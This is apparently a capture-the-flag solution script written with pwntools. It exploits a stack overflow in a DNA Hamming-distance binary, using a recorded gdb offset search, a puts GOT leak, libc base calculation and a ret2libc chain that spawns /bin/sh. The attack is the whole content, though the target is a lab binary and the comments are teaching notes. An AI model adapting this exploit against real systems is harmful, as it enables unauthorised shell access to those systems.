#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./pwn3")
libc = ELF("./libc.so.6")

"""
root@2f5f86d0910a:/opt# pwn cyclic 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
root@2f5f86d0910a:/opt# gdb -q pwn3
Reading symbols from pwn3...
(gdb) run
Starting program: /opt/pwn3
Enter the first DNA sequence:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
Enter the second DNA sequence:
anything
The hamming distance between the two DNA sequences is: 7

Program received signal SIGSEGV, Segmentation fault.
0x000000000040121e in hammingDistance () at pwn3.c:18
18	}
(gdb) info frame
Stack level 0, frame at 0x7ffdf37091c0:
 rip = 0x40121e in hammingDistance (pwn3.c:18); saved rip = 0x6361617663616175
 called by frame at 0x7ffdf37091c8
 source language c.
 Arglist at 0x7ffdf37091b0, args:
 Locals at 0x7ffdf37091b0, Previous frame's sp is 0x7ffdf37091c0
 Saved registers:
  rbp at 0x7ffdf37091b0, rip at 0x7ffdf37091b8
(gdb) !pwn cyclic -l 0x63616175 # <- this comes from the saved rip value
280
"""
offset = 280

def conn():
    if args.LOCAL:
        return process(elf.path)
    else:
        return remote("localhost", 9003)

def main():
    r = conn()

    # helper function to send the payload as the 1st DNA sequence, and send a junk 2nd DNA sequence, and recv the output
    def send_payload(r, payload):
        r.recvuntil("sequence:\n")
        r.sendline(payload)
        r.recvuntil("sequence:\n")
        r.sendline("junk")
        r.recvline() # The hamming distance between ...

    # make a rop chain to leak the value of puts, and jump back to the vulnerable function
    rop = ROP(elf)
    rop.call(elf.symbols['puts'], [elf.got['puts']]) # puts(&puts)
    rop.call(elf.symbols['hammingDistance'])
    send_payload(r, b"A" * offset + rop.chain())

    # read the address of puts
    puts = u64(r.recvline().rstrip().ljust(8, b"\x00"))
    log.info(f"puts found at {hex(puts)}")

    # calculate the base address of libc using the leaked puts address and the known offset to puts
    libc.address = puts - libc.symbols['puts']
    log.info(f"libc base found at {hex(libc.address)}")

    # now that we know the libc addresses in memory, we can simply return to system("/bin/sh")
    rop = ROP(libc)
    rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\x00"))])
    rop.call(libc.symbols['exit'])

    # IMPORTANT: the p64(rop.ret.address) in the below payload is necessary to fix stack alignment
    # in 64 bit land, you must have the stack aligned correctly when calling system() otherwise it will immediately exit
    send_payload(r, b"A" * offset + p64(rop.ret.address) + rop.chain())
    r.interactive()

if __name__ == "__main__":
    main()

